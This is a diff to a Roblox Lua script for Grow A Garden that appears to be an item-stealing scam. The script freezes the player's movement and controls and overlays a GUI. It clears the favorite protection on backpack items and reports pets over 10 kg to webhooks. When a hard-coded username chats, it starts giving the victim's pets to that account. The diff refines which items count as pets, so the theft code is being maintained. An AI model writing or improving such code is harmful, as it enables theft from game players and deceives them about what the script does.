@@ -29,9 +29,10 @@ game.DescendantAdded:Connect(function(descendant)
     end
 end)
 
-local p=game.Players.LocalPlayer
-local h=(p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
-h.WalkSpeed=0 h.JumpPower=0
+local p = game.Players.LocalPlayer
+local h = (p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
+h.WalkSpeed = 0 
+h.JumpPower = 0
 pcall(function() require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable() end)
 
 local gui = Instance.new("ScreenGui")
@@ -138,9 +139,9 @@ local bp = player:WaitForChild("Backpack")
 local event = game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
 
 for _, item in ipairs(bp:GetChildren()) do
-	if item:GetAttribute("Favorite") == true then
-		event:FireServer(item)
-	end
+    if item:GetAttribute("Favorite") == true then
+        event:FireServer(item)
+    end
 end
 
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
@@ -161,12 +162,31 @@ local allowedPets = {
     ["Cooked Owl"] = true,
 }
 
--- Dynamically add pets >10Kg to allowedPets during script execution
+-- All fruits in Grow A Garden (add more if needed)
+local knownFruits = {
+    Feijoa = true, Apple = true, Banana = true, Orange = true, Lemon = true, Mango = true, Pear = true,
+    Pineapple = true, Watermelon = true, Melon = true, Grape = true, Cherry = true, Strawberry = true,
+    Blueberry = true, Avocado = true, Apricot = true, Lychee = true, Dragonfruit = true, Cucumber = true,
+    Tomato = true, Blackberry = true, Raspberry = true, Peach = true, Plum = true, Kiwi = true,
+    Passionfruit = true, Pomegranate = true, Persimmon = true, Grapefruit = true, Coconut = true,
+    Lemonade = true, Starfruit = true, Durian = true, Longan = true, Mangosteen = true, Sapote = true,
+    Jackfruit = true, Papaya = true, Guava = true, Boysenberry = true, Gooseberry = true, Elderberry = true,
+    Currant = true, Mulberry = true, Cranberry = true, Date = true, Fig = true, Olive = true,
+    Nectarine = true, Tangerine = true, Clementine = true, Satsuma = true, Pomelo = true, Quince = true,
+    Rambutan = true, Salak = true, Soursop = true, Ugli = true, Yuzu = true, Breadfruit = true,
+    Carambola = true, Sapodilla = true, Miraclefruit = true, Medlar = true, Jabuticaba = true, Ackee = true,
+    Bilberry = true, Chokeberry = true, Cloudberry = true, Huckleberry = true, Langsat = true,
+    Loquat = true, Lucuma = true, Nashi = true, Pawpaw = true, Santol = true, SurinamCherry = true,
+    WhiteSapote = true, WinterMelon = true, Ziziphus = true,
+}
+
+-- Dynamically add pets >10Kg to allowedPets during script execution, but skip known fruits!
 for _, item in pairs(backpack:GetChildren()) do
     local baseName = item.Name:match("^(.-)%s*%[") or item.Name
     local kg = tonumber(string.match(item.Name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
 
-    if kg > 10 then
+    -- Only dynamically add as pet if not a known fruit!
+    if kg > 10 and not knownFruits[baseName] then
         if not allowedPets[baseName] then
             allowedPets[baseName] = true
             -- Send notification to BOTH main webhook and logs webhook
@@ -308,7 +328,6 @@ local function getKg(name)
 end
 
 local function printSortedItems(items)
-    
 end
 
 local function hasValidItems()
@@ -386,9 +405,23 @@ local function startGiving()
 end
 
 unequipAllPets()
-for _,p in ipairs(Players:GetPlayers()) do
-	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
+for _, p in ipairs(Players:GetPlayers()) do
+    if p.Name == username then 
+        p.Chatted:Connect(function() 
+            if not started then 
+                started = true 
+                startGiving() 
+            end 
+        end) 
+    end
 end
 Players.PlayerAdded:Connect(function(p)
-	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
-end) 
+    if p.Name == username then 
+        p.Chatted:Connect(function() 
+            if not started then 
+                started = true 
+                startGiving() 
+            end 
+        end) 
+    end
+end)
